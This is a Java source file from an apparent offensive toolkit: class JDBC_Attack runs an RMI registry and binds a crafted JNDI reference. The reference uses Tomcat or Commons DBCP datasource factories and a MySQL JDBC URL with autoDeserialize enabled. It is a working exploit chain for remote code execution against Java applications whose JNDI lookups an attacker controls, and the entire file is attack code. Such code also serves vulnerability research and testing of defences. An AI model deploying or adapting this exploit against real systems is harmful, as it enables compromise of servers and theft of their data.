package org.exploit.jndiHighVersion.Tomcat;

import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.util.Hashtable;

public class JDBC_Attack {
    private static String tomcat_dbcp2_RCE(){
        return "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory";
    }
    private static String tomcat_dbcp1_RCE(){
        return "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory";
    }
    private static String commons_dbcp2_RCE(){
        return "org.apache.commons.dbcp2.BasicDataSourceFactory";
    }
    private static String commons_dbcp1_RCE(){
        return "org.apache.commons.dbcp.BasicDataSourceFactory";
    }
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        String factory = tomcat_dbcp2_RCE();
        ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "", true, factory, null);
        String JDBC_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//根据数据库依赖修改JDBC串
        ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);//创建http:目录，然后创建127.0.0.1:8888目录
    }

}
